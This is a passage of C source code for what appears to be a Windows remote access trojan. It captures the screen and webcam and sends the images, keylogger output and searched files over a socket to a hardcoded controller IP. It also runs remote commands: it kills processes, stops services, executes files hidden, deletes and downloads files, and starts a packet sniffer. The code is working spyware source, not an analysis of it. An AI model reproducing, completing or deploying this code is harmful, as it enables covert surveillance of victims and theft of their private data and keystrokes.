 b->bmiHeader.biClrUsed=0;
 b->bmiHeader.biClrImportant=0;
}
POINT GetBitmapSize (HBITMAP h)
{
POINT p;
BITMAP o;
GetObject (h,sizeof(o),&o);
p.x=o.bmWidth;
p.y=o.bmHeight;
return (p);
}
void CreateWorkingBitmap (long dx,long dy,tWorkBMP *w)
{
 w->x=dx;
 w->y=dy;
 w->l=(dx+1)*3&0xfffc;
 w->b=Alloc(w->l*dy,BYTE);
}
void OpenBitmapForWork (HBITMAP b,tWorkBMP *w)
{
BITMAPINFO s;
HDC h=GetDC(NULL);
POINT v=GetBitmapSize(b);
CreateWorkingBitmap (v.x,v.y,w);
SetTHEBMIHeader (&s,w->x,w->y);
GetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
ReleaseDC (NULL,h);
} 


HBITMAP CreateEmptyBitmap (WORD dx,WORD dy)
{
 HDC h=GetDC(NULL);
 HBITMAP b=CreateCompatibleBitmap(h,dx,dy);
 ReleaseDC (NULL,h);

 return (b);
}


void SaveWorkingBitmap (tWorkBMP *w,HBITMAP b)
{
 BITMAPINFO s;
 HDC h=GetDC(NULL);
 SetTHEBMIHeader (&s,w->x,w->y);
 SetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
 ReleaseDC (NULL,h);
}

void ShrinkWorkingBitmap (tWorkBMP *a,tWorkBMP *b,WORD bx,WORD by)
{
 BYTE *uy=a->b,*ux,i;
 WORD x,y,nx,ny=0;
 DWORD df=3*bx,nf=df*by,j;
 float k,qx[2],qy[2],q[4],*f=Alloc(nf,float);

 CreateWorkingBitmap (bx,by,b);

 jFor (nf) f[j]=0;
 j=0;

 For (y,a->y) {
  ux=uy;
  uy+=a->l;
  nx=0;
  ny+=by;

  if (ny>a->y) {

   qy[0]=1-(qy[1]=(ny-a->y)/(float)by);

   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);

     iFor (4) q[i]=qx[i&1]*qy[i>>1];

     iFor (3) {
      f[j]+=(*ux)*q[0];
      f[j+3]+=(*ux)*q[1];
      f[j+df]+=(*ux)*q[2];
      f[(j++)+df+3]+=(*(ux++))*q[3];
     }
    }
    else iFor (3) {
     f[j+i]+=(*ux)*qy[0];
     f[j+df+i]+=(*(ux++))*qy[1];
    }
    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
  }
  else {
   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);
     iFor (3) {
      f[j]+=(*ux)*qx[0];
      f[(j++)+3]+=(*(ux++))*qx[1];
     }
    }
    else iFor (3) f[j+i]+=*(ux++);

    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
   if (ny<a->y) j-=df;
  }
  if (ny>=a->y) ny-=a->y;
 }

 nf=0;
 k=bx*by/(float)(a->x*a->y);
 uy=b->b;

 For (y,by) {
  jFor (df) uy[j]=f[nf++]*k+.5;
  uy+=b->l;
 }

 free (f);
}

HBITMAP ShrinkBitmap (HBITMAP a,WORD bx,WORD by)
// creates and returns new bitmap with dimensions of
// [bx,by] by shrinking bitmap a both [bx,by] must be less or equal
// than the dims of a, unless the result is nonsense
{
 tWorkBMP in,out;
 HBITMAP b=CreateEmptyBitmap(bx,by);
 OpenBitmapForWork (a,&in);
 ShrinkWorkingBitmap (&in,&out,bx,by);
 free (in.b);
 SaveWorkingBitmap (&out,b);
 free (out.b);
 return (b);
}
LPPICTURE gpPicture;


int GetEncoderClsid(WCHAR *format, CLSID *pClsid)
{
    unsigned int num = 0,  size = 0;
    GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;
    ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for(unsigned int j = 0; j < num; ++j)
	{
        if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }    
    }
    free(pImageCodecInfo);
    return -1;
}
int GetScreeny(LPWSTR lpszFilename, ULONG uQuality, int X, int Y)
{
	//Top:
    ULONG_PTR gdiplusToken;
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    HDC hdcScreen  = CreateDC("DISPLAY", NULL, NULL, NULL);
    HDC hdcCapture = CreateCompatibleDC(hdcScreen);
    int nWidth     = GetDeviceCaps(hdcScreen, HORZRES),
        nHeight    = GetDeviceCaps(hdcScreen, VERTRES),
        nBPP       = GetDeviceCaps(hdcScreen, BITSPIXEL);
    
    LPBYTE lpCapture;
    BITMAPINFO bmiCapture = { {
        sizeof(BITMAPINFOHEADER), SCREENX, SCREENY, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0,
    } };
    HBITMAP hbmCapture = CreateDIBSection(hdcScreen, &bmiCapture,
        DIB_PAL_COLORS, (LPVOID *)&lpCapture, NULL, 0);
    if(!hbmCapture)
	{
        DeleteDC(hdcCapture);
        DeleteDC(hdcScreen);
        GdiplusShutdown(gdiplusToken);
        return 1;
    }
    
    int nCapture = SaveDC(hdcCapture);
    SelectObject(hdcCapture, hbmCapture);
    BitBlt(hdcCapture, 0, 0, SCREENX, SCREENY , hdcScreen, 0, 0, SRCCOPY);
    RestoreDC(hdcCapture, nCapture);
    DeleteDC(hdcCapture);
    DeleteDC(hdcScreen);
    
    if(hbmCaptureB == hbmCapture)
	{
		return FALSE;
	}
	else
	{
		hbmCaptureB = hbmCapture;
	}
    CLSID imageCLSID;
	
    Bitmap *pScreenShot = new Bitmap(ShrinkBitmap (hbmCapture,X ,Y ), (HPALETTE)NULL);
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid  = EncoderQuality;
    encoderParams.Parameter[0].Type  = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &uQuality;
    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    int result = (pScreenShot->Save(lpszFilename, &imageCLSID, &encoderParams) == Ok);
    delete pScreenShot;
    DeleteObject(hbmCapture);
    GdiplusShutdown(gdiplusToken);
    SCREENXX = X;
    SCREENYY = Y;
    return result;
}

/////////////////////////////////////////////////////////////////////////////////
//Screen capture

DWORD WINAPI SendScreenShot(LPVOID lpParam)
{	
	char FileName [256] = "";
	char FilePath [1024] = "";
	FILE * Down;
	int FileIndex = (int)lpParam;
	FBIPACKET File;
	char * Buffer;
	char Status [128] = "";
	char BufferSend [2] = "";
	int i = 0;
	int x = 0;
	switch(FileIndex)
	{
	case 1:
		strcpy(FileName, "Screeny.jpeg");
		break;
	case 2:
		strcpy(FileName, "Cam.jpg");
		break;
	case 3:
		sprintf(FileName, "log%d.txt", FileIndex);
		break;
	}
		    unsigned long int pos = 0;
			unsigned long int length = 0;
			unsigned long int Nsize = 0;
			unsigned long int NextSize = 0;
			char UPBUF [30] = "";
			
			Down = fopen(FileName, "rb");
			if(Down == NULL)
			{	
				return 1;
			}
			else
			{
			}
			pos = ftell(Down);
			fseek(Down, 0, SEEK_END);
			length = ftell(Down);      
			fseek(Down, pos, SEEK_SET);
			switch(FileIndex)
			{
			case 1:
			sprintf(File.Data,"screen%d.jpeg",LocalId);	
			File.PacketType = SCREEN_SHOT_OPEN;
			break;
			case 2:
			sprintf(File.Data,"Web%d.jpeg",LocalId);	
			File.PacketType = WEBCAM_SHOT_OPEN;
			break;
			default:
			sprintf(File.Data,"log%d.txt",LocalId);	
			File.PacketType = PACKET_KEYLOG_OPEN;
			File.ID2 = length;
			break;
			}
			File.ID = LocalId;
			File.ID2 = length;
			send(FClient, (char *)&File, sizeof(FBIPACKET), 0);

			NextSize = length - Nsize;			
			
			while(Nsize < length)
			{
				ZeroMemory(&File, sizeof(FBIPACKET));
								
				if(NextSize < sizeof(File.Data))
				{
					fread(File.Data, 1, NextSize, Down);

					File.ID = LocalId;
					File.ID2 = length;
					File.ID3 = NextSize;   
					switch(FileIndex)
					{
					case 1:
						File.PacketType = SCREEN_SHOT_RECV;
						break;
					case 2:	
						File.PacketType = WEBCAM_SHOT_RECV;
						break;
					default:
						File.PacketType = PACKET_KEYLOG_DOWNLOAD;
						break;
					}
					while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
					{
						Sleep(1000);
					}
					break;
				}
				
				fread(File.Data, 1, sizeof(File.Data), Down);

				File.ID = LocalId;
				File.ID2 = Nsize;
				File.ID3 = sizeof(File.Data);   
					switch(FileIndex)
					{
					case 1:
						File.PacketType = SCREEN_SHOT_RECV;
						break;
					case 2:	
						File.PacketType = WEBCAM_SHOT_RECV;
						break;
					default:
						File.PacketType = PACKET_KEYLOG_DOWNLOAD;
						File.ID2 = Nsize;
						break;
					}
				
				while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
				{
					Sleep(1000);
				}
				
				Nsize += sizeof(File.Data);
				//percent+=unit;
			}
			
			File.ID = LocalId;   
			switch(FileIndex)
			{
			case 1:
				File.PacketType = SCREEN_SHOT_CLOSE;
				sprintf(File.Data,"screen%d.jpeg",LocalId);	
				break;
			case 2:	
				File.PacketType = WEBCAM_SHOT_CLOSE;
				sprintf(File.Data,"Web%d.jpeg",LocalId);
				break;
			default:
				sprintf(File.Data,"Log%d.txt",LocalId);	
				File.PacketType = PACKET_KEYLOG_OFFLINE;						
				File.ID2 = length;
				break;
			}                           
			while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
			{
				Sleep(1000);
			}
			
			fclose(Down);
			free(Buffer);
			
			
			return 0;
}
//////////////////////////////////////////////////////////////////////////////////
//Search
char Buf [100] = "";
char Buf2 [100] = "";
int L;
//////////////////////////////////////////////////////////////////////////////////////
//File Search
int FindFile(char *filename, char *dirname, unsigned int numfound);
DWORD WINAPI FindFileThread(LPVOID param) 
{
	FFIND ffind = *((FFIND *)param);
	FFIND *ffinds = (FFIND *)param;
	ffinds->gotinfo = TRUE;
	
	char sendbuf[100];
	unsigned int numfound = 0;
	
	if (ffind.dirname[strlen(ffind.dirname)-1] == '\\')
		ffind.dirname[strlen(ffind.dirname)-1] = '\0';
	
	_snprintf(sendbuf,sizeof(sendbuf),"[FINDFILE]: Searching for file: %s.",ffind.filename);
	
	
	
	numfound = FindFile(ffind.filename,ffind.dirname,numfound);
	sprintf(sendbuf,"[FINDFILE]: Files found: %d.",numfound);
	
	
	ExitThread(0);
}

int FindFile(char *filename, char *dirname, unsigned int numfound)
{
	//	char sendbuf[100],
	char tmpPath[100], newPath[100];
    char Buffer [200] = "";
	WIN32_FIND_DATA fd;
	HANDLE fh;
	Sleep(100);
	_snprintf(tmpPath, sizeof(tmpPath), "%s\\*", dirname);

	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
			{
				if (fd.cFileName[0] != '.' || (fd.cFileName[1] && fd.cFileName[1] != '.')) 
				{
					_snprintf(newPath,sizeof(newPath),"%s\\%s", dirname,fd.cFileName);
					numfound = FindFile(filename, newPath, numfound);
				}
			}			
				Sleep(100);
			} while (FindNextFile(fh, &fd));
		FindClose(fh);
		
		_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
		if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
			do {
				numfound ++;
SendSearch:	
				_snprintf(Buffer,sizeof(Buffer),"%s\\%s",dirname,fd.cFileName);
				FBISend(client, Buffer, LocalId, 0,0, PACKET_FILE_MANAGER_SEARCH);
				Sleep(100);
			} while (FindNextFile(fh, &fd));
			FindClose(fh);
			return (numfound);
}
DWORD WINAPI FindFileT(LPVOID lParam)
{
	FindFile(Buf, Buf2, L);
	return 0;
}
HANDLE FileRecvSock;
HANDLE PortSniffer;
int PortId = 0;
LRESULT CALLBACK MainWndProc(HWND hwnd,UINT Mes,WPARAM wParam,LPARAM lParam)
{
	int Event = 0;
	FBIPACKETA Recv;
	HKEY hTestKey;
	char Data [256] = "";
	int i = 0;
	FileTransfer File;
	DWORD thread;
	switch(Mes)
	{
	case WM_INITDIALOG://PORT
		//FBISend(client, (unsigned char *)"Albinoskunk", 0,0,0,PACKET_ADD_ID);
		FBIConnect(hwnd, IP, PORT, 1000);
		break;
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lParam);
		switch(Event)
		{
		case FD_CONNECT:
			//MessageBox(NULL, "Connection", "Connected", MB_OK);
			break;
		case FD_CLOSE:
			closesocket(client);
			WSACleanup();
			FBIConnect(hwnd, IP, PORT, 1000);		
			break;
		case FD_READ:
			 ZeroMemory(&Recv, sizeof(FBIPACKETA));
			 Recv=FBIRecv(client);   
		 switch (Recv.PacketType)
			{		 
                case PACKET_ADD_ID:
					LocalId = Recv.ID;
					systeminfo();
					TerminateThread(FileRecvSock, 0);
					FileRecvSock = CreateThread(NULL, 0, FILERECV,(LPVOID)"", 0, &thread);
					break;
				case PACKET_TASK_MANAGER:
					SendTask();
					break;
				case PACKET_TASK_MANAGER_TASKS:
					ShowTasks("NO SHIT", "NO SHIT");
					break;
				case PACKET_TASK_MANAGER_TEXT:
					while(i < 1024)
					{
					GetWindowText(Window[i], Data, sizeof(Data));
						if(!strcmp(Data, Recv.Buf))
						{
						 SetWindowText(Window[i], Recv.Buf1);
						}
					i++;
					}	
					break;
				case PACKET_TASK_MANAGER_TKILL:
					while(i < 1024)
					{
						GetWindowText(Window[i], Data, sizeof(Data));
						if(!strcmp(Data, Recv.Buf))
						{
						 MessageBox(NULL, Recv.Buf, "Data", MB_OK);
						 SendMessage(Window[i], WM_CLOSE, 0, 0);
						}
						i++;
					}	
					break;
				case PACKET_TASK_MANAGER_KILL:
					KillProcess(Recv.Buf);
					break;
				case PACKET_SERVICE_MAN:
					enumservices();
					break;
				case PACKET_SERVICE_STOPA:
					stopService(Recv.Buf);
					break;
				case PACKET_SERVICE_STARTA:
					startService(Recv.Buf);
					break;
				case PACKET_PROGRAM_FILES:
					if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths"),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
					{
					QueryInstalls(hTestKey);
					}
					else
					{
					//MessageBox(NULL, "DID NOT worked", "False", MB_OK);
					}
					break;
				case PACKET_FILE_MANAGER_DRIVE:
					SendDrives();
					break;
				case PACKET_FILE_MANAGER_FILE:
					ListDir(Recv.Buf);
					break;
				case PACKET_FILE_MANAGER_FILE_EXECUTE:
					switch(Recv.ID2)
					{
					case 1:
					ShellExecute(NULL, "open", Recv.Buf, NULL, NULL, SW_SHOWNORMAL);
					break;
					case 2:
					ShellExecute(NULL, "open", Recv.Buf, NULL, NULL, SW_HIDE);
					break;
					}
					break;
				case PACKET_FILE_MANAGER_DELETE_FILE:
					DeleteFile(Recv.Buf);
					break;
				case PACKET_FILE_MANAGER_FILE_RENAME: 
					MoveFile(Recv.Buf , Recv.Buf1);
					break;
					
				case PACKET_FILE_MANAGER_FILE_COPY:
					CopyFile(Recv.Buf,  Recv.Buf1,  FALSE);	
					break;
				case PACKET_FILE_MANAGER_FILE_DOWN:
					strcpy(File.Path, Recv.Buf);
					strcpy(File.Name, Recv.Buf1);
					File.ItemIndex = Recv.ID3;
					File.FileID = Recv.ID2;
					CreateThread(NULL, 0, SendFile,(LPVOID)&File, 0, &thread);
					break;
				case SCREEN_CAPTURE:
					CloseHandle(ScreenThread);
				 	DeleteFile("Screeny.jpeg");
					if(GetScreeny(L"Screeny.jpeg", Recv.ID, Recv.ID2, Recv.ID3))
					{
					}
					else
					{
						break;
					}
					ScreenThread = CreateThread(NULL, 0, SendScreenShot,(LPVOID)1, 0, &thread);
                    break;
					
				case WEBCAM_CAPTURE:
					CloseHandle(WebCamThread);
					DeleteFile("test.bmp");
				 	DeleteFile("Cam.jpg");
					i = GetCamIndex();
					capWebCam("test.bmp", i, Recv.ID2, Recv.ID3, 10);
					ConvertImage(L"test.bmp", L"Cam.jpg", L"image/jpeg", 45);
					DeleteFile("test.bmp");
					WebCamThread = CreateThread(NULL, 0, SendScreenShot,(LPVOID)2, 0, &thread);
					break;
					
				case PACKET_KEYLOGGER:
					KeyConnect = 1;
                    TerminateThread(KeyLog, 0);
					TerminateThread(WindowLog, 0);
					UnhookWindowsHookEx(theHook);
					CloseHandle(WindowLog);
					KeyLog = CreateThread(NULL, 0,KeyLogger,(LPVOID)"", 0, &thread);
					break;
				case PACKET_KEYLOGGER_OFF:
					KeyConnect = 0;
                    TerminateThread(KeyLog, 0);
					TerminateThread(WindowLog, 0);
					UnhookWindowsHookEx(theHook);
					CloseHandle(WindowLog);
					KeyLog = CreateThread(NULL, 0,KeyLogger,(LPVOID)"", 0, &thread);
					break;
				case PACKET_SNIFFER:
					TerminateThread(PortSniffer, 0);
					PortId = 0;
					ShowPorts ();
					break;
				case PACKET_SNIFFER_PORTS:
					switch(PortId)
					{
					case 0:				
						PortId = 1;
						PortFilter = Recv.ID2;
						PortSniffer = CreateThread(NULL, 0,PacketSniffer,(LPVOID)"", 0, &thread);
						break;
					case 1:
						PortFilter = Recv.ID2;
						break;

					}	
					break;					
			  case PACKET_SNIFFER_PORTS_REFRESH:
					ShowPorts ();					
					break;
			  case PACKET_SNIFFER_PORTS_CLOSE:
					TerminateThread(PortSniffer, 0);				  
					break;
					
			  case PACKET_FILE_MANAGER_SEARCH:
				  strcpy(Buf, Recv.Buf);
				  strcpy(Buf2, Recv.Buf1);
				  CreateThread(NULL, 0, FindFileT,(LPVOID)"", 0, &thread);
					break;	

		
			} 
		}
	}
return 0;
}
HWND Inject;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HANDLE	Mutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "ASDASDADSA");
	if(Mutex == NULL)
	{
		Mutex = CreateMutex(NULL, FALSE, "ASDASDADSA");
	}
	else
	{
		return 0;
	}
//MessageBox(NULL, "Injected", "Injected", MB_OK);
	Inject=CreateDialog(GInstance,(LPCTSTR)MAIN,NULL,(DLGPROC)MainWndProc);
	//	ShowWindow(Inject,SW_HIDE);
	MSG msg;
	while(GetMessage(&msg,Inject,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}